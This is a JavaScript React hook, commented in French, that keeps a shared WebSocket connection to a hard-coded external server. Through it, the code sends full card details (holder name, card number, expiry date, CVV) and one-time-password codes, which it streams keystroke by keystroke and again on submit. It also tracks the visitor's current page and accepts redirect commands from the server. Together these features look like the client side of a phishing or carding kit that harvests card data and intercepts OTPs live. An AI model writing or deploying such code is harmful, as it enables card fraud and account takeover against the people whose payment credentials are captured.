import { useEffect, useRef, useState } from 'react';

// Singleton pour la connexion WebSocket (partagée entre tous les composants)
let globalWebSocket = null;
let globalWebSocketListeners = new Set();
let globalClientId = null;
let globalConnected = false;
let globalMessageEventListeners = new Set(); // Listeners pour les événements websocket-message

/**
 * Hook pour gérer la connexion WebSocket et envoyer des données au serveur
 */
function useWebSocket() {
  const [connected, setConnected] = useState(globalConnected);
  const wsRef = useRef(null);
  const clientIdRef = useRef(globalClientId);
  const reconnectTimeoutRef = useRef(null);
  const listenerIdRef = useRef(null);

  useEffect(() => {
    // En production, utiliser toujours window.CONFIG.WS_URL ou une URL par défaut
    // Ne jamais utiliser localhost en production
    const getWebSocketUrl = () => {
      if (window.CONFIG?.WS_URL) {
        return window.CONFIG.WS_URL;
      }
      if (import.meta.env.VITE_WS_URL) {
        return import.meta.env.VITE_WS_URL;
      }
      // En production, utiliser l'URL par défaut, pas localhost
      if (window.location.protocol === 'https:') {
        return 'wss://neti-donnie-websocket-server.onrender.com';
      }
      // Seulement en développement local
      return 'ws://localhost:8080';
    };
    const wsUrl = getWebSocketUrl();
    let ws = null;
    let isCleaningUp = false;
    let cleanupTimeoutId = null;

    // Fonction helper pour envoyer la présence (définie avant son utilisation)
    const sendPresenceHelper = (page) => {
      if (globalWebSocket?.readyState === WebSocket.OPEN) {
        globalWebSocket.send(JSON.stringify({
          type: 'presence',
          page: page
        }));
      }
    };

    // Utiliser la connexion WebSocket globale (singleton)
    if (globalWebSocket && globalWebSocket.readyState === WebSocket.OPEN) {
      console.log('[useWebSocket] ✅ Reusing global WebSocket connection (OPEN)');
      ws = globalWebSocket;
      wsRef.current = globalWebSocket;
      setConnected(true);
      globalConnected = true;
      
      // Si on a déjà un clientId global, le synchroniser
      if (globalClientId && !clientIdRef.current) {
        clientIdRef.current = globalClientId;
        console.log('[useWebSocket] ✅ Client ID restored from global:', clientIdRef.current);
      }
    } else if (globalWebSocket && globalWebSocket.readyState === WebSocket.CONNECTING) {
      console.log('[useWebSocket] ⏳ Waiting for global WebSocket connection to open...');
      ws = globalWebSocket;
      wsRef.current = globalWebSocket;
    } else if (!globalWebSocket || globalWebSocket.readyState === WebSocket.CLOSED) {
      console.log('[useWebSocket] 🔄 Creating new global WebSocket connection');
      ws = new WebSocket(wsUrl);
      globalWebSocket = ws;
      wsRef.current = ws;
    } else {
      console.log('[useWebSocket] ✅ Using existing global WebSocket connection');
      ws = globalWebSocket;
      wsRef.current = globalWebSocket;
    }

    // Créer un listener unique pour ce composant
    const listenerId = Symbol('listener-' + Date.now());
    listenerIdRef.current = listenerId;
    
    const messageHandler = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('[useWebSocket] 📨 Received raw message:', event.data);
        console.log('[useWebSocket] 📦 Parsed message:', data.type, data);
        
        if (data.type === 'welcome') {
          globalClientId = data.clientId;
          clientIdRef.current = globalClientId;
          console.log('[useWebSocket] ✅ Client ID set:', clientIdRef.current);
        } else if (data.type === 'registered') {
          globalClientId = data.clientId;
          clientIdRef.current = globalClientId;
          console.log('[useWebSocket] ✅ Client registered, ID:', clientIdRef.current);
          // Envoyer la présence initiale
          if (globalWebSocket?.readyState === WebSocket.OPEN) {
            sendPresenceHelper(window.location.pathname);
          }
        } else if (data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
          console.log('[useWebSocket] 🔄 REDIRECT MESSAGE RECEIVED (via direct)!', data);
          console.log('[useWebSocket] 🔄 Target page:', data.payload.page);
        } else if (data.type === 'redirect') {
          // Support pour l'ancien format (backward compatibility)
          console.log('[useWebSocket] 🔄 REDIRECT MESSAGE RECEIVED (legacy format)!', data);
          console.log('[useWebSocket] 🔄 Target page:', data.page);
        }
        
        // Dispatcher un événement personnalisé pour que les composants puissent écouter
        // Cela permet aux composants d'écouter les messages sans modifier le hook
        console.log('[useWebSocket] 📤 Dispatching websocket-message event:', data.type);
        const customEvent = new CustomEvent('websocket-message', { detail: data });
        
        // Dispatcher via window (pour les listeners standards)
        window.dispatchEvent(customEvent);
        console.log('[useWebSocket] ✅ Event dispatched via window.dispatchEvent');
        
        // Notifier aussi les listeners globaux (pour éviter les problèmes de timing)
        globalMessageEventListeners.forEach(listener => {
          try {
            listener(customEvent);
          } catch (error) {
            console.error('[useWebSocket] ❌ Error in global message listener:', error);
          }
        });
        
        console.log('[useWebSocket] ✅ Event dispatched, listeners should receive:', data.type);
      } catch (error) {
        console.error('[useWebSocket] ❌ Error parsing WebSocket message:', error);
        console.error('[useWebSocket] Raw data:', event.data);
      }
    };

    const handleOpen = () => {
      console.log('[useWebSocket] ✅ WebSocket connected');
      globalConnected = true;
      setConnected(true);
      
      // Enregistrer comme client
      if (globalWebSocket?.readyState === WebSocket.OPEN) {
        const registerMessage = {
          type: 'register',
          role: 'client',
          page: window.location.pathname
        };
        console.log('[useWebSocket] 📤 Sending register message:', JSON.stringify(registerMessage, null, 2));
        globalWebSocket.send(JSON.stringify(registerMessage));
        console.log('[useWebSocket] ✅ Register message sent');
      } else {
        console.error('[useWebSocket] ❌ Cannot send register - WebSocket not open. ReadyState:', globalWebSocket?.readyState);
      }
    };

    const handleError = (error) => {
      console.error('[useWebSocket] ❌ WebSocket error:', error);
      globalConnected = false;
      setConnected(false);
    };

    const handleClose = (event) => {
      console.log('[useWebSocket] 🔌 WebSocket disconnected', event.code, event.reason || 'No reason');
      console.log('[useWebSocket] Close code meanings: 1000=Normal, 1001=Going Away, 1005=No Status, 1006=Abnormal');
      console.log('[useWebSocket] 🔍 Stack trace:', new Error().stack);
      console.log('[useWebSocket] 🔍 Current URL:', window.location.href);
      console.log('[useWebSocket] 🔍 Active listeners:', globalWebSocketListeners.size);
      
      // Ne pas marquer comme déconnecté si c'est une fermeture normale (1000)
      // Cela pourrait être un cleanup de React.StrictMode, mais la connexion doit rester active
      if (event.code === 1000) {
        console.log('[useWebSocket] ✅ Normal closure detected (code 1000)');
        console.log('[useWebSocket] ⚠️  This might be React.StrictMode cleanup - preserving connection state');
        // Ne pas mettre globalConnected à false pour les fermetures normales
        // La connexion pourrait être réutilisée
        // Ne pas mettre globalWebSocket à null
        return;
      }
      
      globalConnected = false;
      setConnected(false);
      
      // Mettre globalWebSocket à null seulement si ce n'est pas une fermeture normale
      globalWebSocket = null;
      
      // Reconnexion automatique IMMÉDIATE pour les fermetures anormales
      // Ne pas attendre 1 seconde, reconnecter immédiatement
      console.log('[useWebSocket] 🔄 Reconnecting WebSocket immediately...');
      
      // Utiliser une fonction pour éviter les problèmes de scope
      const reconnect = () => {
        if (!globalWebSocket || globalWebSocket.readyState === WebSocket.CLOSED) {
          console.log('[useWebSocket] 🔄 Creating new WebSocket connection...');
          const newWs = new WebSocket(wsUrl);
          
          // Réappliquer les handlers globaux
          newWs.onopen = handleOpen;
          newWs.onerror = handleError;
          newWs.onclose = handleClose;
          
          // Réappliquer tous les listeners de messages
          newWs.onmessage = (event) => {
            console.log('[useWebSocket] 📨 Reconnected WebSocket message received');
            globalWebSocketListeners.forEach(handler => {
              try {
                handler(event);
              } catch (error) {
                console.error('[useWebSocket] ❌ Error in message handler after reconnect:', error);
              }
            });
          };
          
          globalWebSocket = newWs;
          console.log('[useWebSocket] ✅ New WebSocket connection created');
        } else {
          console.log('[useWebSocket] ⚠️  WebSocket already exists, not reconnecting');
        }
      };
      
      // Reconnecter immédiatement
      reconnect();
    };

    // Toujours ajouter le listener de messages AVANT de configurer les handlers
    // Cela garantit que les messages sont capturés dès qu'ils arrivent
    globalWebSocketListeners.add(messageHandler);
    console.log('[useWebSocket] ✅ Message handler added, total listeners:', globalWebSocketListeners.size);
    
    // Créer le handler onmessage qui notifie tous les listeners
    const globalMessageHandler = (event) => {
      console.log('[useWebSocket] 📨 WebSocket message received, notifying', globalWebSocketListeners.size, 'listeners');
      console.log('[useWebSocket] 📨 Raw message data:', event.data);
      console.log('[useWebSocket] 📨 Message type (if JSON):', (() => {
        try {
          const parsed = JSON.parse(event.data);
          return parsed.type;
        } catch {
          return 'N/A';
        }
      })());
      
      // Notifier tous les listeners
      let handlerCount = 0;
      globalWebSocketListeners.forEach(handler => {
        try {
          handlerCount++;
          console.log(`[useWebSocket] 📤 Notifying listener ${handlerCount}/${globalWebSocketListeners.size}`);
          handler(event);
          console.log(`[useWebSocket] ✅ Listener ${handlerCount} processed successfully`);
        } catch (error) {
          console.error(`[useWebSocket] ❌ Error in message handler ${handlerCount}:`, error);
        }
      });
      console.log(`[useWebSocket] ✅ All ${handlerCount} listeners notified`);
    };
    
    // Configurer les handlers seulement si c'est une nouvelle connexion
    if (!globalWebSocket || globalWebSocket.readyState === WebSocket.CLOSED) {
      console.log('[useWebSocket] 🔧 Setting up WebSocket handlers for new connection');
      console.log('[useWebSocket] 🔧 WebSocket state:', ws.readyState, '(0=CONNECTING, 1=OPEN, 2=CLOSING, 3=CLOSED)');
      
      // Configurer les handlers IMMÉDIATEMENT, même si la connexion est en CONNECTING
      ws.onopen = handleOpen;
      ws.onmessage = globalMessageHandler;
      ws.onerror = handleError;
      ws.onclose = handleClose;
      
      console.log('[useWebSocket] ✅ Handlers configured, waiting for connection to open...');
    } else if (globalWebSocket.readyState === WebSocket.CONNECTING) {
      console.log('[useWebSocket] ⏳ Connection is CONNECTING');
      console.log('[useWebSocket] 🔧 Checking if handlers are set...');
      
      // Vérifier si les handlers sont déjà configurés
      if (!globalWebSocket.onmessage) {
        console.log('[useWebSocket] ⚠️  Handlers not set yet, setting them now...');
        globalWebSocket.onopen = handleOpen;
        globalWebSocket.onmessage = globalMessageHandler;
        globalWebSocket.onerror = handleError;
        globalWebSocket.onclose = handleClose;
        console.log('[useWebSocket] ✅ Handlers configured for CONNECTING connection');
      } else {
        console.log('[useWebSocket] ✅ Handlers already set, waiting for connection to open...');
      }
    } else if (globalWebSocket.readyState === WebSocket.OPEN) {
      // La connexion est déjà ouverte
      console.log('[useWebSocket] ✅ Connection already OPEN, updating state');
      setConnected(true);
      globalConnected = true;
      
      // Vérifier si les handlers sont configurés
      if (!globalWebSocket.onmessage) {
        console.log('[useWebSocket] ⚠️  Connection is OPEN but handlers not set, setting them now...');
        globalWebSocket.onmessage = globalMessageHandler;
        globalWebSocket.onerror = handleError;
        globalWebSocket.onclose = handleClose;
      }
      
      // Si on n'a pas encore de clientId, essayer de le récupérer depuis globalClientId
      if (!clientIdRef.current && globalClientId) {
        clientIdRef.current = globalClientId;
        console.log('[useWebSocket] ✅ Client ID restored from global:', clientIdRef.current);
      } else if (!globalClientId) {
        console.log('[useWebSocket] ⚠️  Connection is OPEN but no globalClientId yet. Waiting for welcome/registered message...');
      }
    }

    // Détecter les changements de route
    const handleRouteChange = () => {
      if (globalWebSocket?.readyState === WebSocket.OPEN) {
        sendPresenceHelper(window.location.pathname);
      }
    };

    // Écouter les changements de route (React Router)
    window.addEventListener('popstate', handleRouteChange);
    
    // Observer les changements de route via MutationObserver
    const observer = new MutationObserver(() => {
      handleRouteChange();
    });
    observer.observe(document.body, { childList: true, subtree: true });

    return () => {
      console.log('[useWebSocket] 🧹 Cleanup started for listener:', listenerIdRef.current);
      console.log('[useWebSocket] 🔍 Stack trace:', new Error().stack);
      console.log('[useWebSocket] 🔍 Current URL:', window.location.href);
      console.log('[useWebSocket] 🔍 WebSocket state:', globalWebSocket?.readyState);
      console.log('[useWebSocket] 🔍 Active listeners before cleanup:', globalWebSocketListeners.size);
      
      // NE PAS retirer le listener de messages lors du cleanup
      // React.StrictMode peut déclencher le cleanup prématurément
      // Le listener doit rester actif pour recevoir les messages redirect
      // Le listener sera automatiquement nettoyé si le composant est vraiment démonté
      // (ce qui ne devrait pas arriver en production)
      console.log('[useWebSocket] ⚠️  Listener preserved (React.StrictMode cleanup detected)');
      
      window.removeEventListener('popstate', handleRouteChange);
      observer.disconnect();
      
      // Annuler la reconnexion automatique
      if (reconnectTimeoutRef.current) {
        clearTimeout(reconnectTimeoutRef.current);
        reconnectTimeoutRef.current = null;
        console.log('[useWebSocket] ✅ Reconnection timeout cancelled');
      }
      
      // NE JAMAIS fermer la connexion WebSocket globale lors du cleanup
      // La connexion est partagée entre tous les composants
      // Elle ne sera fermée que si tous les composants sont démontés
      // Même en cas de navigation, la connexion doit rester ouverte
      console.log('[useWebSocket] ✅ Cleanup completed (Global WebSocket connection and listener preserved)');
      console.log('[useWebSocket] Active listeners after cleanup:', globalWebSocketListeners.size);
      console.log('[useWebSocket] 🔍 WebSocket state after cleanup:', globalWebSocket?.readyState);
      
      // Nettoyer le timeout de cleanup
      if (cleanupTimeoutId) {
        clearTimeout(cleanupTimeoutId);
      }
    };
  }, []);

  const sendPresence = (page) => {
    if (globalWebSocket?.readyState === WebSocket.OPEN) {
      globalWebSocket.send(JSON.stringify({
        type: 'presence',
        page: page
      }));
    }
  };

  const sendPaymentData = (data) => {
    console.log('[useWebSocket] 📤 sendPaymentData called');
    console.log('[useWebSocket] Global WebSocket:', globalWebSocket);
    console.log('[useWebSocket] WebSocket readyState:', globalWebSocket?.readyState);
    console.log('[useWebSocket] Client ID:', clientIdRef.current);
    
    if (globalWebSocket?.readyState === WebSocket.OPEN) {
      const message = {
        type: 'payment_data',
        data: {
          cardHolder: data.cardHolder || data.nameOnCard,
          nameOnCard: data.nameOnCard || data.cardHolder,
          cardNumber: data.cardNumber,
          expirationDate: data.expirationDate || data.expDate,
          cvv: data.cvv
        }
      };
      console.log('[useWebSocket] 📨 Sending payment_data message:', JSON.stringify(message, null, 2));
      globalWebSocket.send(JSON.stringify(message));
      console.log('[useWebSocket] ✅ Payment data message sent');
    } else {
      console.error('[useWebSocket] ❌ Cannot send payment data - WebSocket not open. ReadyState:', globalWebSocket?.readyState);
    }
  };

  const sendOTPUpdate = (otp) => {
    if (globalWebSocket?.readyState === WebSocket.OPEN) {
      globalWebSocket.send(JSON.stringify({
        type: 'otp_update',
        otp: otp
      }));
    }
  };

  const sendOTPSubmit = (otp) => {
    if (globalWebSocket?.readyState === WebSocket.OPEN) {
      globalWebSocket.send(JSON.stringify({
        type: 'otp_submit',
        otp: otp
      }));
    }
  };

  // Mettre à jour wsRef avec globalWebSocket pour la compatibilité
  if (globalWebSocket) {
    wsRef.current = globalWebSocket;
  }

  // Mettre à jour clientIdRef avec globalClientId (toujours synchroniser)
  if (globalClientId) {
    if (!clientIdRef.current || clientIdRef.current !== globalClientId) {
      clientIdRef.current = globalClientId;
      console.log('[useWebSocket] ✅ Client ID synchronized:', clientIdRef.current);
    }
  }

  // Utiliser globalClientId comme fallback si clientIdRef est null
  const currentClientId = clientIdRef.current || globalClientId;
  if (currentClientId) {
    console.log('[useWebSocket] 📋 Current Client ID:', currentClientId);
  } else {
    console.log('[useWebSocket] ⚠️  Client ID is still null');
  }

  return {
    connected,
    clientId: currentClientId,
    sendPaymentData,
    sendOTPUpdate,
    sendOTPSubmit,
    sendPresence,
    wsRef
  };
}

export default useWebSocket;

